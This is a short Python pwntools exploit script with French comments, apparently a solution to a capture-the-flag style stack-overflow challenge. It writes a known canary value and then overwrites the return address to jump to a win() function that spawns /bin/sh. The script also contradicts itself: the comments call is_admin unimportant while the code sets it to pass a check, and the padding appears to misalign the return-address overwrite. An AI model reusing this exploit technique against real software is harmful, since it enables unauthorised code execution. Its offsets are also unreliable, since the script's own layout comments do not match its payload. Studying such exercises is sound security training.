#!/usr/bin/env python3
"""
Exploit bonus : ret2win pour obtenir un shell
Combine bypass du canary + ret2win vers la fonction win()

Layout de la stack :
rbp-0x50: buffer[80]
rbp-0x8:  canary (0x3bdcf)  
rbp-0x4:  is_admin (pas important pour le shell)
rbp:      saved rbp (8 bytes)
rbp+8:    return address (à écraser avec win)

Fonction win() à 0x401166 qui exécute execve("/bin/sh", NULL, NULL)
"""

from pwn import *

# Configuration  
binary = './canary'
p = process(binary)

# Adresses importantes
win_addr = 0x401166
canary_value = 0x3bdcf

# Construction du payload pour ret2win
# Buffer (72 bytes) + canary (4 bytes) + padding (4 bytes pour is_admin)
# + saved rbp (8 bytes) + return address (8 bytes vers win)

payload = b'A' * 72                    # Remplir le buffer
payload += p32(canary_value)           # Canary correct pour passer la vérification
payload += p32(5)                      # is_admin = 5 pour passer le check
payload += b'C' * 4                    # Padding jusqu'à rbp
payload += b'D' * 8                    # Saved RBP  
payload += p64(win_addr)               # Return address vers win()

print(f"[+] Payload length: {len(payload)} bytes")
print(f"[+] Win function address: 0x{win_addr:x}")
print(f"[+] Sending payload to get shell...")

# Envoyer le payload
p.sendline(payload)

# Passer en mode interactif pour utiliser le shell
p.interactive()